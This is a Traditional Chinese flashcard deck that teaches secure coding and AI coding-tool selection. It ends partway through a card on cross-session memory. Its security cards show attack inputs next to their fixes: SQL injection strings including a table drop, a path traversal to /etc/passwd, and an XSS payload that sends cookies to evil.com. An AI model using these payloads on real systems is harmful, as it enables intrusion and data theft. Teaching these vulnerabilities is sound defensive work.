# 模組 1 記憶卡庫：AI 編程基礎認知

## 📋 記憶卡庫概述

本記憶卡庫採用**情境驅動記憶法**，基於 Anki 間隔重複系統（SRS）設計，幫助學員建立長期記憶。

**核心理念**：
> 不是記住「/agents 是什麼」，而是記住「需要專家分析時用 /agents」。
> 不是背誦定義，而是建立「情境 → 行動」的神經連結。

**記憶卡特色**：
- 基於真實場景設計
- 測試決策能力而非事實記憶
- 包含完整的思考過程
- 提供記憶輔助技巧

---

## 🎯 使用指南

### Anki 設定建議

**安裝 Anki**：
- 桌面版：https://apps.ankiweb.net/
- 行動版：AnkiDroid（Android）/ AnkiMobile（iOS）

**匯入卡片**：
```
1. 下載本目錄的 Anki 卡片檔（.apkg 格式）
2. 在 Anki 中選擇「檔案 → 匯入」
3. 選擇卡片庫：「AI Programming - Module 1」
```

**複習設定**：
```
新卡片/天：10-15 張
複習順序：隨機
間隔：1 天 → 3 天 → 7 天 → 14 天 → 30 天
```

---

### 如何使用記憶卡

#### 標準流程

**看到問題時**：
1. 遮住答案
2. 在腦中完整思考
3. 想像真實場景
4. 嘗試給出完整答案

**查看答案後**：
- **理解度評分**：
  - ⚫ Again（重來）：完全不記得或答錯
  - 🔴 Hard（困難）：答對但花了很長時間
  - 🟢 Good（良好）：答對且思考流暢
  - 🔵 Easy（簡單）：立即想起且非常確信

**不要**：
- ❌ 只看不想就翻答案
- ❌ 看到熟悉的題目就按「Easy」
- ❌ 跳過思考過程

**應該**：
- ✅ 每次都完整思考
- ✅ 想像真實場景
- ✅ 說出完整答案
- ✅ 理解「為什麼」

---

### 記憶卡分類體系

```
記憶卡庫/
├── A_安全漏洞識別/（8 張）
│   └── SQL 注入、XSS、路徑遍歷等
├── B_工具選擇決策/（6 張）
│   └── Copilot vs Claude Code vs Gemini CLI
├── C_上下文工程/（7 張）
│   └── CLAUDE.md 設計、Memory 系統
├── D_程式碼驗證/（5 張）
│   └── 驗證清單、品質評估
└── E_綜合應用/（4 張）
    └── 混合場景、決策流程
```

**總計**：30 張記憶卡

---

## 🔒 A - 安全漏洞識別（8 張）

### A01：識別 SQL 注入

**【情境】**
你在審查以下程式碼：

```python
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query).fetchone()
```

**問題**：
1. 這段程式碼有什麼安全問題？
2. 攻擊者可以如何利用？
3. 如何修復？

---

**【解答】**

**1. 安全問題：SQL 注入漏洞**

**2. 利用方式**：
```python
# 正常輸入
username = "alice"
# → SELECT * FROM users WHERE username = 'alice'

# 惡意輸入
username = "alice' OR '1'='1"
# → SELECT * FROM users WHERE username = 'alice' OR '1'='1'
# 結果：返回所有使用者

# 更惡意的輸入
username = "alice'; DROP TABLE users; --"
# → SELECT * FROM users WHERE username = 'alice'; DROP TABLE users; --'
# 結果：刪除整個 users 表
```

**3. 修復方法**：
```python
# 方法 1：參數化查詢（推薦）
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,)).fetchone()

# 方法 2：ORM（最佳）
def get_user(username):
    return User.query.filter_by(username=username).first()
```

**【記憶點】**
```
看到字串拼接 SQL → 想到 SQL 注入 → 改用參數化查詢
```

**【延伸思考】**
- 哪些情況下參數化查詢也不夠？（動態表名、ORDER BY）
- NoSQL 資料庫會有類似問題嗎？（答：會，NoSQL 注入）

---

### A02：密碼加密陷阱

**【情境】**
AI 生成了以下密碼儲存程式碼：

```python
import hashlib

def store_password(password):
    hashed = hashlib.md5(password.encode()).hexdigest()
    return hashed
```

**問題**：
1. 這段程式碼有什麼問題？
2. 為什麼不安全？
3. 應該如何改進？

---

**【解答】**

**1. 問題：使用 MD5 加密密碼**

**2. 為什麼不安全**：
- **MD5 已被破解**：彩虹表攻擊可快速破解
- **沒有鹽（Salt）**：相同密碼產生相同雜湊
- **計算速度太快**：暴力破解成本低

**範例**：
```python
# MD5 相同密碼相同雜湊
md5("password123") = "482c811da5d5b4bc6d497ffa98491e38"
# 所有使用 "password123" 的使用者雜湊都相同
# 攻擊者破解一個 = 破解所有
```

**3. 正確做法**：
```python
# 方法 1：使用 bcrypt（推薦）
import bcrypt

def store_password(password):
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode(), salt)
    return hashed

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)

# 方法 2：使用 Python 內建 hashlib + salt
import hashlib
import os

def store_password(password):
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return salt + key
```

**【記憶點】**
```
看到 MD5 / SHA1 用於密碼 → 不安全 → 改用 bcrypt / Argon2
```

**【延伸思考】**
- bcrypt 為什麼更安全？（答：慢速演算法 + 自動加鹽）
- 什麼是「加鹽」？（答：在密碼前加入隨機字串）

---

### A03：路徑遍歷漏洞

**【情境】**
檔案上傳功能：

```javascript
app.post('/upload', (req, res) => {
    const filename = req.body.filename;
    fs.writeFileSync(`./uploads/${filename}`, req.body.content);
    res.json({ success: true });
});
```

**問題**：
1. 這段程式碼有什麼漏洞？
2. 攻擊者可以做什麼？
3. 如何防禦？

---

**【解答】**

**1. 漏洞：路徑遍歷（Path Traversal）**

**2. 攻擊範例**：
```javascript
// 正常使用
filename = "report.pdf"
// → ./uploads/report.pdf

// 惡意輸入
filename = "../../../etc/passwd"
// → ./uploads/../../../etc/passwd
// → /etc/passwd（覆蓋系統檔案！）

filename = "../../app.js"
// → ./uploads/../../app.js
// → 覆蓋應用程式碼
```

**3. 防禦方法**：
```javascript
const path = require('path');

app.post('/upload', (req, res) => {
    const filename = req.body.filename;

    // 方法 1：移除路徑分隔符
    const safeName = path.basename(filename);

    // 方法 2：白名單驗證
    if (!/^[a-zA-Z0-9_-]+\.[a-z]{2,4}$/.test(filename)) {
        return res.status(400).json({ error: "Invalid filename" });
    }

    // 方法 3：檢查最終路徑
    const uploadDir = path.resolve('./uploads');
    const filePath = path.resolve(uploadDir, safeName);

    if (!filePath.startsWith(uploadDir)) {
        return res.status(400).json({ error: "Invalid path" });
    }

    fs.writeFileSync(filePath, req.body.content);
    res.json({ success: true });
});
```

**【記憶點】**
```
看到使用者輸入拼接路徑 → 想到路徑遍歷 → 使用 path.basename() 或白名單
```

---

### A04：XSS 攻擊識別

**【情境】**
評論功能：

```javascript
app.get('/comments', (req, res) => {
    const comments = db.getComments();
    let html = '<div>';
    comments.forEach(comment => {
        html += `<p>${comment.text}</p>`;
    });
    html += '</div>';
    res.send(html);
});
```

**問題**：這段程式碼有什麼安全問題？

---

**【解答】**

**漏洞：跨站腳本攻擊（XSS - Cross-Site Scripting）**

**攻擊範例**：
```javascript
// 正常評論
comment.text = "這是一個好產品"
// → <p>這是一個好產品</p>

// 惡意評論
comment.text = "<script>alert('XSS')</script>"
// → <p><script>alert('XSS')</script></p>
// 結果：腳本執行！

// 更惡意的攻擊
comment.text = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
// 結果：竊取所有使用者的 Cookie
```

**修復方法**：
```javascript
// 方法 1：轉義 HTML（推薦）
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

app.get('/comments', (req, res) => {
    const comments = db.getComments();
    let html = '<div>';
    comments.forEach(comment => {
        html += `<p>${escapeHtml(comment.text)}</p>`;
    });
    html += '</div>';
    res.send(html);
});

// 方法 2：使用模板引擎（自動轉義）
// React、Vue、Angular 等框架自動處理

// 方法 3：Content Security Policy (CSP)
res.setHeader('Content-Security-Policy', "script-src 'self'");
```

**【記憶點】**
```
看到使用者輸入直接插入 HTML → 想到 XSS → 轉義或使用模板引擎
```

---

### A05：記憶體洩漏陷阱

**【情境】**
快取實作：

```python
cache = {}

def get_data(key):
    if key in cache:
        return cache[key]

    data = fetch_from_api(key)
    cache[key] = data
    return data
```

**問題**：這段程式碼有什麼問題？

---

**【解答】**

**問題：無限增長的快取導致記憶體洩漏**

**問題分析**：
```python
# 場景：高流量 API
# 每個不同的 key 都會被永久快取
# 1 小時 → 10,000 個不同的 key
# 1 天 → 240,000 個 key
# 1 週 → 1,680,000 個 key
# 記憶體持續增長 → 最終 OOM（Out Of Memory）
```

**修復方法**：
```python
# 方法 1：使用 LRU Cache（推薦）
from functools import lru_cache

@lru_cache(maxsize=1000)
def get_data(key):
    return fetch_from_api(key)

# 方法 2：使用 TTL（Time To Live）
from cachetools import TTLCache

cache = TTLCache(maxsize=1000, ttl=3600)  # 1 小時過期

def get_data(key):
    if key in cache:
        return cache[key]

    data = fetch_from_api(key)
    cache[key] = data
    return data

# 方法 3：使用 Redis（生產環境推薦）
import redis
r = redis.Redis()

def get_data(key):
    cached = r.get(key)
    if cached:
        return json.loads(cached)

    data = fetch_from_api(key)
    r.setex(key, 3600, json.dumps(data))  # 1 小時過期
    return data
```

**【記憶點】**
```
看到無限增長的 dict/list → 想到記憶體洩漏 → 使用 LRU Cache 或 TTL
```

---

### A06：敏感資料洩露

**【情境】**
錯誤處理：

```python
@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    try:
        user = db.execute(f"SELECT * FROM users WHERE id = {user_id}").fetchone()
        return jsonify(user)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
```

**問題**：這段程式碼有哪些安全問題？

---

**【解答】**

**問題 1：SQL 注入**（已在 A01 中說明）

**問題 2：敏感資訊洩露**

**洩露範例**：
```python
# 錯誤訊息可能包含：
{
    "error": "OperationalError: no such table: users"
}
# → 洩露資料庫結構

{
    "error": "OperationalError: disk I/O error on /var/lib/mysql/..."
}
# → 洩露檔案系統路徑

{
    "error": "ProgrammingError: column 'password_hash' does not exist"
}
# → 洩露資料庫欄位資訊
```

**修復方法**：
```python
import logging

logger = logging.getLogger(__name__)

@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    try:
        # 使用參數化查詢
        user = db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()

        if not user:
            return jsonify({"error": "User not found"}), 404

        return jsonify(user)

    except Exception as e:
        # 記錄完整錯誤（僅內部）
        logger.error(f"Error fetching user {user_id}: {str(e)}", exc_info=True)

        # 返回通用錯誤訊息（對外）
        return jsonify({"error": "Internal server error"}), 500
```

**【記憶點】**
```
看到直接返回 Exception → 想到資訊洩露 → 記錄詳細錯誤 + 返回通用訊息
```

---

### A07：競態條件（Race Condition）

**【情境】**
餘額扣減：

```python
def deduct_balance(user_id, amount):
    user = get_user(user_id)
    if user.balance >= amount:
        user.balance -= amount
        save_user(user)
        return True
    return False
```

**問題**：並發情況下會發生什麼？

---

**【解答】**

**問題：競態條件（Race Condition）**

**攻擊場景**：
```python
# 使用者餘額：100 元
# 同時發起 2 個請求，各購買 80 元商品

# 請求 A：
user.balance = 100  # 讀取
if 100 >= 80:       # 通過
    # （此時請求 B 也讀取到 100）

# 請求 B：
user.balance = 100  # 讀取
if 100 >= 80:       # 通過

# 請求 A：
user.balance = 100 - 80 = 20  # 更新
save_user(user)

# 請求 B：
user.balance = 100 - 80 = 20  # 更新（覆蓋 A 的更新）
save_user(user)

# 結果：花了 160 元，但餘額只減少 80 元！
```

**修復方法**：
```python
# 方法 1：資料庫鎖（推薦）
from sqlalchemy import select
from sqlalchemy.orm import Session

def deduct_balance(user_id, amount):
    with Session() as session:
        # SELECT ... FOR UPDATE（鎖定行）
        user = session.execute(
            select(User).where(User.id == user_id).with_for_update()
        ).scalar_one()

        if user.balance >= amount:
            user.balance -= amount
            session.commit()
            return True
        return False

# 方法 2：樂觀鎖（版本號）
def deduct_balance(user_id, amount):
    user = get_user(user_id)
    old_version = user.version

    if user.balance >= amount:
        # UPDATE ... WHERE version = old_version
        affected = db.execute(
            "UPDATE users SET balance = balance - ?, version = version + 1 "
            "WHERE id = ? AND version = ?",
            (amount, user_id, old_version)
        ).rowcount

        if affected == 0:
            # 版本衝突，重試
            return deduct_balance(user_id, amount)

        return True
    return False

# 方法 3：原子操作（Redis）
def deduct_balance(user_id, amount):
    key = f"user:{user_id}:balance"
    # 原子操作：先檢查再扣減
    new_balance = r.decrby(key, amount)
    if new_balance < 0:
        r.incrby(key, amount)  # 回退
        return False
    return True
```

**【記憶點】**
```
看到「讀取 → 判斷 → 寫入」+ 並發 → 想到競態條件 → 使用資料庫鎖或原子操作
```

---

### A08：不安全的隨機數

**【情境】**
生成驗證碼：

```python
import random

def generate_verification_code():
    return str(random.randint(100000, 999999))
```

**問題**：這段程式碼有什麼問題？

---

**【解答】**

**問題：使用不安全的隨機數生成器**

**為什麼不安全**：
```python
# random 模組使用偽隨機數生成器（PRNG）
# 給定相同的種子，生成相同的序列

# 攻擊場景：
# 1. 攻擊者觀察到連續的驗證碼
# 2. 推測出種子值
# 3. 預測下一個驗證碼

# 範例：
random.seed(12345)
print(random.randint(100000, 999999))  # 586074
print(random.randint(100000, 999999))  # 127150

random.seed(12345)  # 重置種子
print(random.randint(100000, 999999))  # 586074（相同！）
print(random.randint(100000, 999999))  # 127150（相同！）
```

**修復方法**：
```python
# 方法 1：使用 secrets 模組（推薦）
import secrets

def generate_verification_code():
    return str(secrets.randbelow(900000) + 100000)

# 方法 2：使用 os.urandom
import os

def generate_verification_code():
    random_bytes = os.urandom(3)
    code = int.from_bytes(random_bytes, 'big') % 900000 + 100000
    return str(code)

# 方法 3：使用 secrets 生成字母數字組合
import secrets
import string

def generate_verification_code(length=6):
    alphabet = string.ascii_uppercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))
```

**【記憶點】**
```
看到 random 用於安全相關 → 不安全 → 改用 secrets 或 os.urandom
```

---

## 🛠️ B - 工具選擇決策（6 張）

### B01：日常開發場景

**【情境】**
你的團隊正在開發一個 React 電商網站，每天需要：
- 快速補全程式碼
- 生成單元測試
- 重構小型函數
- 即時獲得建議

**問題**：
1. 哪個工具最適合？
2. 理由是什麼？
3. 如何配置？

---

**【解答】**

**最佳選擇：GitHub Copilot**

**理由**：
1. **即時補全**：IDE 內建，零延遲
2. **上下文自動管理**：無需手動配置
3. **學習曲線低**：開箱即用
4. **成本效益高**：$10/月，日常開發足夠

**配置建議**：
```javascript
// .vscode/settings.json
{
  "github.copilot.enable": {
    "*": true,
    "javascript": true,
    "typescript": true,
    "typescriptreact": true
  },
  "editor.inlineSuggest.enabled": true,
  "github.copilot.autocomplete.enable": true
}
```

**使用技巧**：
```javascript
// 技巧 1：詳細註解
// 函數：計算購物車總價，包含折扣和運費
function calculateTotal(cart, discountCode, shippingMethod) {
  // Copilot 會生成完整實作
}

// 技巧 2：範例驅動
// 單元測試範例
test('should calculate total with discount', () => {
  // Copilot 會生成測試程式碼
});
```

**不適用場景**：
- 複雜的多檔案重構（用 Claude Code）
- 全局架構分析（用 Gemini CLI）
- 需要專家級審查（用 Claude Code + agents）

**【記憶點】**
```
日常開發 + 即時補全 → GitHub Copilot
```

---

### B02：大型重構專案

**【情境】**
API 版本升級（v1 → v2）：
- 修改 50+ 檔案
- 保持一致性
- 需要規劃和驗證
- 不能出錯

**問題**：哪個工具最適合？為什麼？

---

**【解答】**

**最佳選擇：Claude Code**

**理由**：
1. **顯式上下文管理**：完全控制上下文範圍
2. **工作流程編排**：探索 → 規劃 → 編碼 → 驗證
3. **有狀態記憶**：CLAUDE.md 記錄架構決策
4. **多代理人協作**：使用不同 agents 進行審查

**工作流程**：
```bash
# 步驟 1：載入專案
claude --add-dir ./src/api/v1

# 步驟 2：探索階段
claude
> 分析 src/api/v1/ 下所有 API 端點，找出需要修改的地方

# 步驟 3：規劃階段
> 制定詳細的遷移計劃，分階段進行

# 步驟 4：編碼階段
> 按計劃執行第一階段遷移，完成後暫停

# 步驟 5：驗證階段
claude /agents:code-reviewer
> 審查遷移後的程式碼

claude /agents:security-auditor
> 進行安全審查
```

**為什麼不用 Copilot**：
- 無法全局規劃
- 無法跨檔案一致性保證
- 無狀態，無法記住架構決策

**為什麼不用 Gemini CLI**：
- 一次性分析後無持久記憶
- 無工作流程編排能力

**【記憶點】**
```
大型重構 + 需要規劃 + 跨檔案 → Claude Code
```

---

### B03：快速理解新專案

**【情境】**
你加入新團隊，需要快速理解一個 15,000 行的開源專案：
- 完全陌生的程式碼庫
- 需要全局架構理解
- 準備貢獻程式碼
- 時間緊迫（1 天內）

**問題**：最快的方法是什麼？

---

**【解答】**

**最佳選擇：Gemini CLI（初步理解）+ Claude Code（深入開發）**

**階段 1：使用 Gemini CLI 快速理解（2 小時）**
```bash
# 一次性載入整個程式碼庫
gemini /code --add-dir ./project/src

# 快速提問
> 這個專案的主要功能是什麼？
> 核心模組有哪些？各自的職責？
> 資料流向如何？
> 如果我要添加新功能，應該修改哪些檔案？

# 生成 onboarding 文檔
> 為新開發者生成詳細的專案架構文檔
```

**階段 2：使用 Claude Code 深入開發（剩餘時間）**
```bash
# 基於 Gemini 的分析，建立 CLAUDE.md
claude /init

# 編輯記憶檔案
claude /memory
# 填入 Gemini 分析的關鍵資訊

# 開始開發
claude --add-dir ./src/core
> 我要添加新的認證功能，應該如何設計？
```

**為什麼混合使用**：
- **Gemini CLI 優勢**：巨量上下文（1M+ tokens），快速全局理解
- **Claude Code 優勢**：持久記憶，工作流程編排，適合開發

**單獨使用的問題**：
- **只用 Copilot**：無全局理解能力
- **只用 Claude Code**：上下文窗口有限，載入 15K 行可能超限
- **只用 Gemini CLI**：一次性分析後無記憶，開發時需重複提問

**【記憶點】**
```
大型程式碼庫 + 快速理解 → Gemini CLI（初步）+ Claude Code（開發）
```

---

### B04：知識萃取工作

**【情境】**
技術寫手需要從 50 份技術文檔（PDF + Word + 圖片）中：
- 提取關鍵資訊
- 生成結構化筆記
- 建立知識地圖
- 自動化整理

**問題**：哪個工具最適合？

---

**【解答】**

**最佳選擇：Claude Code + MCP 伺服器**

**理由**：
1. **多模態能力**：處理 PDF、圖片、表格
2. **知識整理強項**：擅長結構化資訊提取
3. **工作流程自動化**：MCP 整合外部工具
4. **記憶系統**：長期積累知識

**工作流程**：
```bash
# 配置 MCP 伺服器
claude /mcp
# 添加：
# - PDF 解析 MCP
# - 圖片識別 MCP
# - Notion/Obsidian 整合 MCP

# 批量處理文檔
claude
> 請處理 docs/ 資料夾下的所有 PDF 檔案：
> 1. 提取關鍵概念
> 2. 建立概念關聯圖
> 3. 生成結構化筆記
> 4. 保存到 Notion

# 自動化工作流程
# 創建自訂指令
# .claude/commands/extract-knowledge.md
```

**為什麼不用其他工具**：
- **Copilot**：不適合非程式碼工作
- **Gemini CLI**：無持久記憶，無 MCP 整合

**【記憶點】**
```
知識工作 + 多模態 + 自動化 → Claude Code + MCP
```

---

### B05：安全審查

**【情境】**
金融系統需要全面安全審查：
- SQL 注入掃描
- XSS 漏洞檢測
- 權限控制檢查
- 生成詳細報告

**問題**：如何設計審查流程？

---

**【解答】**

**最佳方案：Claude Code + 專家 Agents**

**工作流程**：
```bash
# 步驟 1：使用安全審查 agent
claude /agents:security-auditor
claude --add-dir ./src

# 步驟 2：分類掃描
> 請進行全面安全審查：
> 1. SQL 注入掃描（所有資料庫查詢）
> 2. XSS 漏洞掃描（所有使用者輸入）
> 3. 權限控制檢查（所有 API 端點）
> 4. 敏感資料洩露檢查（日誌、錯誤訊息）
> 5. 加密演算法檢查（密碼、Token）

# 步驟 3：生成報告
claude /output-style:security-report
> 生成詳細的安全審查報告，包含：
> - 嚴重程度分級
> - 具體程式碼位置
> - 修復建議
> - 範例程式碼

# 步驟 4：自動修復（可選）
> 對於低風險漏洞，請自動生成修復補丁
```

**進階配置**：
```bash
# 整合自動化掃描工具
# .claude/hooks/pre-execute.yaml
pre-execute:
  - command: bandit -r ./src
  - command: semgrep --config=auto ./src
```

**為什麼用 Claude Code**：
- 專家 agents 提供專業分析
- 生成詳細報告
- 可自動修復部分問題

**【記憶點】**
```
安全審查 + 專業分析 → Claude Code + security-auditor agent
```

---

### B06：混合工具鏈設計

**【情境】**
5 人小型團隊，預算 $100/月，需要涵蓋：
- 日常開發
- 程式碼審查
- 重構專案
- 知識管理

**問題**：如何設計混合工具鏈？

---

**【解答】**

**方案：3 Copilot + 2 Claude Code**

**工具分配**：
```
角色 1-3（前端開發）：
  - GitHub Copilot（$10/月 × 3 = $30/月）
  - 用於：日常開發、快速補全

角色 4（後端 Lead）：
  - Claude Code Pro（$20/月）
  - 用於：複雜重構、架構設計、程式碼審查

角色 5（全端 + DevOps）：
  - Claude Code Pro（$20/月）
  - 用於：CI/CD 自動化、跨團隊協作

總成本：$30 + $40 = $70/月（預算內）
```

**使用策略**：
```
日常開發（80% 時間）：
  → 全員使用 Copilot

複雜任務（15% 時間）：
  → Lead 使用 Claude Code
  → 其他成員透過 Pair Programming 參與

程式碼審查（5% 時間）：
  → Lead 使用 Claude Code + agents
  → 生成審查報告供全員參考
```

**知識分享**：
```bash
# 建立團隊共享的 CLAUDE.md
# 所有成員都可以受益

team-repo/
├── CLAUDE.md（團隊共享）
├── .claude/
│   └── memory/（長期知識積累）
```

**【記憶點】**
```
預算有限 + 小團隊 → 混合使用（Copilot 日常 + Claude Code 複雜任務）
```

---

## 🧠 C - 上下文工程（7 張）

### C01：CLAUDE.md 結構設計

**【情境】**
新專案需要建立 CLAUDE.md，但不確定應該包含哪些章節。

**問題**：
1. 哪些章節是必須的？
2. 哪些是可選的？
3. 如何決定優先級？

---

**【解答】**

**必須包含（核心）**：
```markdown
1. 專案概述（2-3 句話）
   → 讓 AI 理解「這是什麼專案」

2. 技術棧（語言、框架、資料庫）
   → 讓 AI 知道「用什麼工具」

3. 架構原則（2-3 個核心原則）
   → 讓 AI 知道「設計哲學」

4. 編碼規範（格式化、命名、測試）
   → 讓 AI 知道「程式碼風格」

5. 常見問題（至少 2 個真實問題）
   → 讓 AI 避免「已知坑」
```

**推薦包含（重要）**：
```markdown
6. API 契約（如果是 API 專案）
   → 確保 API 一致性

7. 資料庫架構（主要表結構）
   → 避免破壞資料完整性

8. 錯誤處理標準（如何處理異常）
   → 統一錯誤處理方式
```

**可選包含（次要）**：
```markdown
9. 部署資訊
10. 監控和日誌
11. 團隊工作流程
12. 開發環境設定
```

**決策樹**：
```
專案概述 → 必須
技術棧 → 必須
架構原則 → 必須
編碼規範 → 必須
常見問題 → 必須（如果有）

是 API 專案？
  是 → 添加 API 契約（重要）
  否 → 跳過

資料庫複雜？
  是 → 添加資料庫架構（重要）
  否 → 簡單說明即可

其他章節 → 按需添加
```

**【記憶點】**
```
CLAUDE.md 核心 5 要素：概述 + 技術棧 + 架構 + 規範 + 常見問題
```

---

### C02：上下文容量管理

**【情境】**
Claude Code 顯示：
```
上下文使用情況：
├─ 程式碼檔案：180,000 tokens (90%)
├─ 專案記憶：15,000 tokens (7.5%)
└─ 總計：195,000 / 200,000 tokens
```

**問題**：
1. 需要採取行動嗎？
2. 如何優化？
3. 什麼時候應該壓縮？

---

**【解答】**

**1. 是否需要行動**：
```
< 70%：安全，無需行動
70-80%：注意，可能需要清理
80-90%：警告，應該優化（當前狀態）
> 90%：緊急，必須立即處理
```

**當前狀態（90%）：需要立即優化**

**2. 優化策略**：
```bash
# 策略 1：移除不必要的檔案
# 檢查哪些檔案占用最多
claude /context --verbose

# 移除測試檔案（如果不需要）
# 移除自動生成的檔案
# 移除註解過多的檔案

# 策略 2：壓縮上下文
claude /compact
# 保留關鍵資訊，移除冗餘

# 策略 3：優化 CLAUDE.md
# 移除過時資訊
# 簡化範例程式碼
# 合併重複內容

# 策略 4：分階段載入
# 不要一次性載入所有檔案
# 只載入當前需要的模組
```

**3. 壓縮時機**：
```
情況 A：上下文 > 80%
  → 立即壓縮

情況 B：會話時間 > 30 分鐘
  → 考慮壓縮（對話冗餘增加）

情況 C：切換主題
  → 壓縮舊主題的上下文

情況 D：生成大量程式碼後
  → 壓縮已完成部分的討論
```

**【記憶點】**
```
上下文 > 80% → 立即優化（/compact + 移除不必要檔案）
```

---

### C03：Memory 系統使用

**【情境】**
你在開發過程中發現一個重要的架構決策：
「所有 API 回應必須包含 request_id 以便追蹤」

**問題**：如何記錄這個決策以便 AI 未來遵守？

---

**【解答】**

**步驟 1：即時記錄**
```bash
# 方法 1：使用 ## 語法（快速）
## 架構決策：所有 API 回應必須包含 request_id
{
  "request_id": "uuid",
  "data": {...}
}

# 方法 2：使用 /memory 命令（詳細）
claude /memory
```

**步驟 2：更新 CLAUDE.md**
```markdown
## API 設計規範

### 回應格式
所有 API 回應必須包含以下欄位：

1. **request_id**（必須）
   - 類型：UUID v4
   - 用途：請求追蹤和除錯
   - 生成方式：伺服器端自動生成

**範例**：
```json
{
  "request_id": "550e8400-e29b-41d4-a716-446655440000",
  "timestamp": "2025-01-30T10:00:00Z",
  "data": {
    "user_id": 123,
    "username": "alice"
  }
}
```

**實作**：
```python
import uuid
from fastapi import Request, Response

@app.middleware("http")
async def add_request_id(request: Request, call_next):
    request_id = str(uuid.uuid4())
    response = await call_next(request)
    response.headers["X-Request-ID"] = request_id
    return response
```
```

**步驟 3：驗證記憶**
```bash
# 測試 AI 是否記住
claude
> 生成一個新的 API 端點，返回使用者資料

# 檢查生成的程式碼是否包含 request_id
```

**【記憶點】**
```
重要決策 → 立即記錄（## 或 /memory）→ 更新 CLAUDE.md → 驗證效果
```

---

### C04：隱式 vs 顯式上下文

**【情境】**
你在選擇工具時，看到「隱式上下文管理」和「顯式上下文管理」。

**問題**：
1. 這兩者有什麼區別？
2. 各自的優缺點？
3. 什麼情況用哪種？

---

**【解答】**

**隱式上下文管理（Copilot）**：
```
工作方式：
- 自動索引當前工作區
- 優先考慮開啟的分頁
- 自動載入相關檔案
- 無需手動配置

優點：
✓ 零配置，開箱即用
✓ 無學習曲線
✓ 適合快速開發

缺點：
✗ 無法精確控制上下文範圍
✗ 可能載入不相關檔案
✗ 無長期記憶
✗ 無法理解架構決策
```

**顯式上下文管理（Claude Code）**：
```
工作方式：
- 手動指定目錄（--add-dir）
- 透過 CLAUDE.md 定義規範
- 使用 /memory 持久化知識
- 完全控制上下文內容

優點：
✓ 精確控制上下文範圍
✓ 可記錄架構決策
✓ 跨會話持久記憶
✓ 適合複雜專案

缺點：
✗ 需要初始設定
✗ 有學習曲線
✗ 需要維護 CLAUDE.md
```

**選擇策略**：
```
場景 A：小型專案 + 快速開發
  → 隱式上下文（Copilot）

場景 B：中大型專案 + 需要架構控制
  → 顯式上下文（Claude Code）

場景 C：新專案探索階段
  → 隱式上下文（快速迭代）

場景 D：專案成熟期
  → 顯式上下文（確保一致性）
```

**【記憶點】**
```
隱式 = 自動但不精確（Copilot）
顯式 = 手動但可控（Claude Code）
```

---

### C05：首次正確率提升

**【情境】**
統計顯示：
- 有 CLAUDE.md：首次正確率 82%
- 無 CLAUDE.md：首次正確率 35%

**問題**：為什麼會有這麼大的差異？

---

**【解答】**

**原因分析**：

**無 CLAUDE.md 時 AI 的問題**：
```python
# AI 不知道專案規範，可能生成：
def authenticate_user(username, password):
    # 問題 1：不知道應該用參數化查詢
    query = f"SELECT * FROM users WHERE username = '{username}'"

    # 問題 2：不知道應該用 bcrypt
    hashed = hashlib.md5(password.encode()).hexdigest()

    # 問題 3：不知道錯誤處理標準
    user = db.execute(query).fetchone()  # 沒有 try-catch

    # 問題 4：不知道回應格式
    return user  # 不符合 API 規範
```

**有 CLAUDE.md 時 AI 的行為**：
```python
# AI 參考 CLAUDE.md 中的規範：
# 1. 資料庫查詢必須用參數化查詢
# 2. 密碼必須用 bcrypt
# 3. 所有函數必須有 try-catch
# 4. API 回應必須包含 request_id

def authenticate_user(username: str, password: str) -> dict:
    """使用者認證"""
    try:
        # 參數化查詢
        user = db.execute(
            "SELECT * FROM users WHERE username = ?",
            (username,)
        ).fetchone()

        if not user:
            return {"error": "User not found"}

        # 使用 bcrypt 驗證
        if not bcrypt.checkpw(password.encode(), user.password_hash):
            return {"error": "Invalid password"}

        # 符合 API 規範
        return {
            "request_id": str(uuid.uuid4()),
            "data": {
                "user_id": user.id,
                "username": user.username
            }
        }

    except Exception as e:
        logger.error(f"Authentication error: {str(e)}")
        return {"error": "Internal server error"}
```

**差異總結**：
```
無 CLAUDE.md：
  AI 基於「通用知識」生成
  → 不符合專案規範
  → 需要多次修改

有 CLAUDE.md：
  AI 基於「專案規範」生成
  → 首次就符合要求
  → 減少迭代次數
```

**【記憶點】**
```
CLAUDE.md = 專案規範 → 首次正確率從 35% → 82%
```

---

### C06：跨會話記憶持久化

**【情境】**
昨天你用 Claude Code 完成了一個功能，今天開啟新會話，AI 似乎不記得昨天的內容。

**問題**：
1. 為什麼不記得？
2. 如何實現跨會話記憶？
3. 哪些資訊應該持久化？

---

**【解答】**

**1. 為什麼不記得**：
```
每個會話是獨立的：
- 對話歷史只存在於當前會話
- 關閉 Claude Code → 對話歷史丟失
- 下次開啟 → 全新會話

例外：
- CLAUDE.md 是持久化的
- 透過 /memory 保存的知識是持久化的
```

**2. 如何實現跨會話記憶**：
```bash
# 方法 1：更新 CLAUDE.md（推薦）
claude /memory
# 將重要決策寫入 CLAUDE.md

# 方法 2：使用 ## 快速記錄
## 昨天實作的認證功能使用 JWT，有效期 24 小時

# 方法 3：建立專案日誌
# .claude/journal/2025-01-29.md
- 實作 JWT 認證
- 有效期設定為 24 小時
- 使用 RS256 演算法
```

**3. 應該持久化的資訊**：
```markdown
✓ 應該持久化：
- 架構決策（為什麼選擇 X 而不是 Y）
- API 契約變更
- 常見問題解決方案
- 重要的程式碼模式
- 安全規範

✗ 不需要持久化：
- 臨時測試程式碼
- 調試過程
- 已解決的一次性問題
- 冗長的對話歷史
```

**實例**：
```markdown
# CLAUDE.md

## 架構決策記錄

### 2025-01-29：認證系統
**決策**：使用 JWT 而非 Session
**理由**：
- 無狀態，易於水平擴展
- 適合微服務架構
- 支援跨域認證

**實作細節**：
